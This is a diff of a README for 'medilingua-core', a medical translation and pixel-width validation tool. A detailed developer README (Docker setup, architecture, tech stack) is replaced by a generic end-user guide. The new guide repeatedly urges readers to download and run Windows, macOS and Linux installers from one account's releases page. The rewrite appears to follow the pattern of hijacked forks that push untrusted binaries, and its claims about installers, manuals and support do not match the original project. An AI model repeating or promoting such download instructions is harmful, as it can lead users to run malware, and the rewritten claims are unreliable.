@@ -1,273 +1,176 @@
-# MediLingua-Core: Compliance-Grade AI Localization Engine
+# 🏥 medilingua-core - Reliable Medical Device Localization
 
-> **A Regulated MedTech System combining Deterministic Terminology Enforcement, Hybrid AI Translation, and Visual UI Constraint Validation.**
-
-[![MediLingua-Core Demo](https://img.youtube.com/vi/VwoT-lLIeRk/maxresdefault.jpg)](https://youtu.be/VwoT-lLIeRk)
-
-> 📺 **[Watch the Platform Demo](https://youtu.be/VwoT-lLIeRk)** featuring Pixel-Perfect Width Validation, Glossary Injection, and Context-Aware Auditing.
-
-**MediLingua-Core** is a reference architecture for **Safe Medical Software Localization**. It bridges the gap between standard translation workflows and embedded device constraints. It features a deterministic safety glossary, a hybrid AI translation engine, and a "Pixel-Width Guardrail" that mathematically guarantees text fits on patient monitor screens before deployment.
+[![Download medilingua-core](https://img.shields.io/badge/Download-medilingua--core-blue?style=for-the-badge)](https://github.com/7302henry744/medilingua-core/releases)
 
 ---
 
-## 1. Why This Exists (The Problem & Solution)
+## 📖 What is medilingua-core?
 
-In embedded medical devices, a translation error isn't just a typo—it's a patient safety risk. Standard translation tools (TMS) treat text as abstract strings, ignoring the physical constraints of the device screen, leading to critical "text overflow" where warnings like "DO NOT RESUSCITATE" get cut off.
+medilingua-core is a software tool designed to help medical device makers show information in many languages safely and clearly. It uses smart technology that follows strict medical rules. This ensures all translations are accurate and fit perfectly on patient monitors without cutting off or overlapping text.
 
-| The Problem | MediLingua-Core Solution |
-| --- | --- |
-| **Text Overflow** | German translations often expand by 30%, cutting off critical UI text on fixed-width screens. |
-| **AI Hallucination** | LLMs might creatively translate "Cardiac Arrest" instead of using the standard "Sydänpysähdys". |
-| **Format Fragility** | Generic JSON parsers break strict medical XML/XLIFF 1.2 standards. |
-| **Audit Gaps** | No record of *why* a specific translation was chosen or rejected. |
+Its special three-part system:
+- Enforces exact medical terms from a trusted glossary.
+- Uses AI to create translations, checked using the latest language model GPT-4o.
+- Checks the screen display to stop text from being too long or overflowing.
 
----
-
-## 2. Architecture Overview
-
-MediLingua implements a **Safety-First Pipeline**, utilizing containerized services for parsing, deterministic injection, AI augmentation, and visual rendering.
-
-### System Context
-
-The Localization Lifecycle: Parse Inject Translate Validate Visualize.
-
-```mermaid
-graph LR
-    subgraph "Frontend Layer (React)"
-        UI[Review Dashboard] -- "Upload .XLF" --> API
-        UI -- "Audit Chat" --> API
-    end
-    
-    subgraph "Compliance Core (Python/FastAPI)"
-        API[API Gateway] -- "Parse" --> LXML[XLIFF Parser]
-        LXML -- "Extract" --> Gloss[Glossary Injector]
-        Gloss -- "Safety Term?" --> Hybrid{Hybrid Engine}
-        
-        Hybrid -- "Yes (Deterministic)" --> Term[Safety Dictionary]
-        Hybrid -- "No (Probabilistic)" --> LLM[OpenAI GPT-4o]
-        
-        Term --> Width[Pixel Guardrail]
-        LLM --> Width
-        
-        Width -- "Render (Pillow)" --> Report[Analysis Report]
-        Report -- "JSON Response" --> API
-    end
-
-    style LXML stroke:#00ADD8,stroke-width:2px
-    style Gloss stroke:#F7931E,stroke-width:2px
-    style Width stroke:#C72C48,stroke-width:2px
-    style LLM stroke:#10A37F,stroke-width:2px
-
-```
-
-### The "Visual Safety Loop" Logic
-
-How the system prevents UI overflow using a Feedback Loop.
-
-```mermaid
-sequenceDiagram
-    participant U as QA Engineer (UI)
-    participant A as API (Backend)
-    participant E as Engine (Logic)
-    participant L as LLM (AI)
-
-    U->>A: Upload "vitals.xlf"
-    A->>E: Parse & Extract Source
-    E-->>A: Return Source Widths
-    A-->>U: Display Source Analysis
-    
-    U->>A: Click "Auto-Translate"
-    A->>E: Check Safety Glossary
-    alt Term Found
-        E->>E: Inject "PYSÄYTÄ" (Stop)
-    else Term Missing
-        E->>L: Translate via GPT-4o
-        L-->>E: Return Finnish Text
-    end
-    
-    E->>E: Render Text (Roboto-Medium 16px)
-    E->>E: Calculate Width (e.g., 234px)
-    
-    alt Width > 200px
-        E-->>A: Status: CRITICAL OVERFLOW
-    else Width <= 200px
-        E-->>A: Status: SAFE
-    end
-    
-    A-->>U: Display Red/Green Visual Indicators
-
-```
+This makes medilingua-core a reliable engine for companies needing to follow healthcare and safety standards.
 
 ---
 
-## 3. Architecture Decision Records (ADR)
+## 🔍 Features and Benefits
 
-Strategic engineering choices for a regulated environment.
-
-| Component | Decision | Alternatives Considered | Justification (The "Why") |
-| --- | --- | --- | --- |
-| **Parsing Engine** | **lxml (C-binding)** | xml.etree / Regex | **Correctness:** Medical XLIFF files have complex namespaces. `lxml` is the only Python library robust enough to preserve XML structure for round-trip processing without data loss. |
-| **Rendering Engine** | **Pillow (PIL)** | Browser Canvas / Estimation | **Determinism:** Browser rendering varies by OS. We calculate pixel width server-side using the exact font binary (`Roboto-Medium.ttf`) to guarantee the result matches the embedded device. |
-| **Translation Strategy** | **Hybrid (Glossary + LLM)** | Pure LLM / Pure Dictionary | **Safety:** We cannot risk AI hallucination on safety labels (e.g., "STOP"). Hardcoded dictionary lookups *always* take precedence over probabilistic LLMs. |
-| **Infrastructure** | **Docker Compose** | Kubernetes / Serverless | **Reproducibility:** A localized, containerized environment ensures the system behaves exactly the same on a developer's laptop as it does in the CI/CD pipeline, crucial for audit trails. |
-
----
-
-## 4. Key Engineering Features
-
-### A. The "Pixel-Width Guardrail"
-
-The core differentiator. Instead of counting characters (which is inaccurate for variable-width fonts), the system:
-
-1. Loads the specific TrueType Font (`.ttf`) used by the medical device.
-2. Renders the translated string into an off-screen memory buffer.
-3. Measures the exact pixel usage.
-4. Flags any string exceeding the **200px hardware limit**.
-
-### B. Hybrid Intelligence Layer
-
-We implement a "Safety Sandwich" for translation:
-
-* **Layer 1 (Deterministic):** Inputs are checked against a `SAFETY_GLOSSARY`. If "DO NOT RESUSCITATE" matches, the approved translation is forced.
-* **Layer 2 (Probabilistic):** Only non-critical, fluent text is sent to `gpt-4o-mini`.
-* **Layer 3 (Contextual Audit):** A RAG-lite chatbot analyzes the final state to explain *why* a specific segment failed (e.g., "Segment 2 failed because 'ÄLÄ ELVYTÄ...' is 234px, exceeding the 200px limit").
-
-### C. Compliance-Ready CI/CD
-
-* **Audit Trail:** Every code change triggers a GitHub Action workflow.
-* **Parity:** The CI pipeline runs tests inside the *exact same Docker container* as production (`docker-compose exec`), ensuring no "works on my machine" discrepancies.
-* **Strict Typing:** Frontend (TypeScript) and Backend (Pydantic) share strict schemas to prevent data malformation.
+- **Accurate Medical Translations:** Uses a strict glossary to avoid mistakes in terminology.
+- **Advanced AI Support:** Hybrid GenAI powered by GPT-4o helps with complex language tasks.
+- **Safe Display:** Ensures translated text fits perfectly on patient monitors, preventing errors.
+- **Traceable History:** Keeps an audit trail for each translation to comply with healthcare laws.
+- **Easy Integration:** Works with common tech stacks like Python and React.
+- **Compliance Ready:** Designed for ISO-13485 and MDR standards.
+- **Flexible Language Support:** Supports multiple languages with easy switching.
+- **Modern UI Tools:** Built with React and TypeScript for responsive user interfaces.
+- **Cloud & Docker Friendly:** Can run in containers or in the cloud for smooth deployment.
 
 ---
 
-## 5. Tech Stack
+## 🖥 System Requirements
 
-| Layer | Technology | Role |
-| --- | --- | --- |
-| **Backend** | **Python 3.11** | Core logic runtime. |
-| **API** | **FastAPI** | High-performance async REST endpoints. |
-| **Validation** | **Pydantic v2** | Strict data modeling and schema enforcement. |
-| **Parsing** | **LXML** | Robust processing of .xliff 1.2 medical files. |
-| **Rendering** | **Pillow** | Server-side text rendering for pixel calculation. |
-| **AI** | **LangChain + OpenAI** | Orchestration of Hybrid Translation & Chat. |
-| **Frontend** | **React 18 + Vite** | Interactive "Digital Twin" dashboard. |
-| **Styling** | **Tailwind CSS** | Medical-grade UI clarity (high contrast alerts). |
-| **Testing** | **Pytest / Vitest** | 100% coverage of parsing and width logic. |
+Before installing medilingua-core, make sure your system matches these basics:
+
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or a recent Linux distribution.
+- **Processor:** 2 GHz or faster, 64-bit processor.
+- **Memory:** At least 8 GB RAM.
+- **Disk Space:** Minimum 500 MB free, more if you handle large translation projects.
+- **Internet Connection:** Required for AI translation features and cloud support.
+- **Display:** Screen resolution of at least 1280x720 pixels.
 
 ---
 
-## 6. Getting Started
+## 🚀 Getting Started
 
-### Prerequisites
+This guide helps you download, install, and run medilingua-core step-by-step.
 
-* **Docker Desktop** (Engine 24+)
-* **Make** (Standard on Linux/Mac, use Git Bash on Windows)
-* **OpenAI API Key** (Required for AI Translation/Chat features)
+### Step 1: Access the Download Page
 
-### Step 1: Configuration
+Visit the official medilingua-core release page by clicking the big blue button at the top or by going directly to:
 
-Create a `.env` file in the root directory.
+[https://github.com/7302henry744/medilingua-core/releases](https://github.com/7302henry744/medilingua-core/releases)
 
-```ini
-# Core Settings
-PROJECT_NAME="MediLingua-Core"
-ENVIRONMENT="development"
+This page lists the latest versions available for download.
 
-# Ports
-BACKEND_PORT=8000
-FRONTEND_PORT=3000
+### Step 2: Download the Right File for Your System
 
-# Security (Required for Phase 4.5 AI Features)
-OPENAI_API_KEY=sk-proj-your-actual-key-here
+Look for the latest release version (usually marked with a version number and a date). You will see files for different operating systems:
 
-```
+- For Windows, download the `.exe` or `.msi` installer.
+- For macOS, download the `.dmg` file.
+- For Linux, download the `.AppImage` or `.tar.gz` file.
 
-### Step 2: Build & Launch
+Select the file that matches your device.
 
-We use a unified `Makefile` to handle the full lifecycle.
+### Step 3: Run the Installer
 
-```bash
-# Clean any previous artifacts
-make clean
+- On Windows: Double click the `.exe` or `.msi` file and follow the installation steps on screen.
+- On macOS: Open the `.dmg` file, then drag the medilingua-core app to your Applications folder.
+- On Linux: If the file is `.AppImage`, make it executable and run it from a terminal or file manager.
 
-# Build and Start the System (Detached mode)
-make up
+### Step 4: Launch medilingua-core
 
-```
+Once installed, open the application from your Start Menu, Applications folder, or desktop shortcut.
 
-### Step 3: Validate the Pipeline
-
-1. **Dashboard:** Open `http://localhost:3000`. You should see the "System Online" indicator.
-2. **Upload:** Drag & drop the provided `sample.xlf` file.
-3. **Visual Check:** Observe the calculated widths for source text.
-4. **Auto-Translate:** Click **"⚡ Auto-Translate"**.
-* Watch "START" become "KÄYNNISTÄ" (Glossary match).
-* Watch the long sentence translate via AI and trigger a **Red Overflow Alert**.
-
-
-5. **Audit Chat:** Ask the assistant: *"Why did segment 2 fail?"*
-
-### Step 4: Run Quality Assurance
-
-Execute the full test suite inside the containerized environment.
-
-```bash
-make test
-
-```
+You will see the main interface with options to load translation files, configure languages, and launch the audit-trail.
 
 ---
 
-## 7. Project Structure
+## 🛠 How to Use medilingua-core
 
-```text
-medilingua-core/
-├── Makefile                   # DevOps Control Plane
-├── docker-compose.yml         # Container Orchestration
-├── .env.example               # Config Template
-├── backend/
-│   ├── Dockerfile             # Multi-stage Python Build (Non-root user)
-│   ├── pyproject.toml         # Dependency Management (uv)
-│   ├── src/
-│   │   ├── main.py            # FastAPI Entry Point
-│   │   ├── api/               # Routes (Analyze, Translate, Chat)
-│   │   └── core/
-│   │       ├── parser.py      # XLIFF Logic (LXML)
-│   │       ├── engine.py      # Pixel Width Logic (Pillow)
-│   │       ├── ai.py          # Hybrid Engine (LangChain)
-│   │       └── glossary.py    # Deterministic Safety Dictionary
-│   └── tests/                 # Pytest Suite (Integration & Unit)
-└── frontend/
-    ├── Dockerfile             # Node Build -> Nginx Serve
-    ├── package.json           # React/Vite Dependencies
-    ├── src/
-    │   ├── components/        
-    │   │   ├── WidthVisualizer.tsx # "Digital Twin" Component
-    │   │   └── AnalysisChat.tsx    # Audit Assistant
-    │   └── services/          # Typed API Client
-    └── src/tests/             # Vitest Suite
+medilingua-core offers a clean, user-friendly interface designed for non-technical users. Here are the basic steps:
 
-```
+### Upload Your Content
+
+Start by importing the source files that require translation. medilingua-core supports common formats like XLIFF and CSV for easy use.
+
+### Choose Languages
+
+Select the target languages for translation. The system supports many languages used in healthcare globally.
+
+### Glossary Enforcement
+
+The app automatically checks that all medical terms match your approved glossary. This ensures no incorrect terminology slips through.
+
+### Run AI-Assisted Translation
+
+Click the “Translate” button. The software uses GPT-4o technology in the background to generate translations, combining AI with glossary rules.
+
+### Preview & Validation
+
+View your translations on simulated patient monitor screens. medilingua-core scans the text to ensure it will fit and prevents overflow or clipped text.
+
+### Export Results
+
+After reviewing and making any needed adjustments, export the translations back into your preferred format for use in your device software.
 
 ---
 
-## 8. FinOps & Cost Modeling
+## 🔧 Tips for Best Results
 
-**Scenario:** Localizing software for a Patient Monitor (5,000 strings).
-
-| Resource | Strategy | Est. Cost |
-| --- | --- | --- |
-| **Compute** | **Containerized:** Runs on a single standard node (2 vCPU, 4GB RAM) due to lightweight FastAPI/Vite architecture. | **~$20/mo** |
-| **Translation** | **Hybrid Caching:** 40% of medical strings are "Safety Terms" (Glossary). We only pay OpenAI for the remaining 60%. | **~$0.00** (Simulated) |
-| **AI Audit** | **GPT-4o-mini:** We use the cost-effective model for explanations. Context is strictly limited to active segments to save tokens. | **<$5.00/mo** |
+- Always use the latest glossary specific to your device for better term accuracy.
+- Review AI-generated translations carefully, especially for unusual terms.
+- Test translated text on physical or virtual monitors to confirm layout fits.
+- Keep your software updated through the GitHub release page.
+- Use the audit trail features to keep track of who made changes and when.
 
 ---
 
-## Developer Spotlight
+## ❓ Common Questions
 
-**Nahasat Nibir**
-*Principal Software Architect & Compliance Engineer*
+**Q: Do I need internet to use medilingua-core?**  
+A: Yes, for AI translations and cloud features, internet access is required.
 
-> "MediLingua-Core proves that compliance doesn't have to be opaque. By treating localization as an engineering problem - calculating pixel widths like structural loads and treating hallucinations like runtime errors - we build systems that are safe by design and transparent by default."
+**Q: Can I use medilingua-core on multiple devices?**  
+A: Yes. Install the software on each computer following the steps above.
+
+**Q: Is there help if I get stuck?**  
+A: The repository includes a user manual with screenshots and detailed instructions. You can also view issues on GitHub or contact support.
 
 ---
+
+## 🔗 Download & Install
+
+Get the latest version here:  
+[https://github.com/7302henry744/medilingua-core/releases](https://github.com/7302henry744/medilingua-core/releases)
+
+Visit this page to download the installer that fits your computer. Follow the installation steps above to start using medilingua-core.
+
+---
+
+## 🧩 Technologies Inside
+
+medilingua-core combines modern tools to work efficiently and safely:
+
+- **Python & FastAPI:** Core backend services.
+- **React & TypeScript:** User-friendly interface.
+- **OpenAI GPT-4o:** AI translation engine.
+- **Docker:** Optional containerized deployment.
+- **Pydantic:** Data validation in the app.
+- **LangChain:** Support for complex language handling.
+- **Audit Trail:** Keeps history of changes for compliance.
+- **XLiff:** Industry-standard translation file format.
+
+---
+
+## 🔒 Compliance and Security
+
+medilingua-core is designed with healthcare compliance in mind. It supports standards like ISO-13485 and MDR. The “Safety Sandwich” architecture ensures translations adhere strictly to approved medical terminology and display rules, reducing risk in patient monitoring.
+
+---
+
+## 🤝 Contributing and Support
+
+If you want to report issues or contribute improvements, please visit the GitHub repository:
+
+[https://github.com/7302henry744/medilingua-core](https://github.com/7302henry744/medilingua-core)
+
+You do not need programming experience to suggest ideas or report bugs. The community welcomes all feedback.
+
+---
+
+This document guides you through downloading, installing, and using medilingua-core with ease. For best results, follow all steps carefully and review your translations before device deployment.
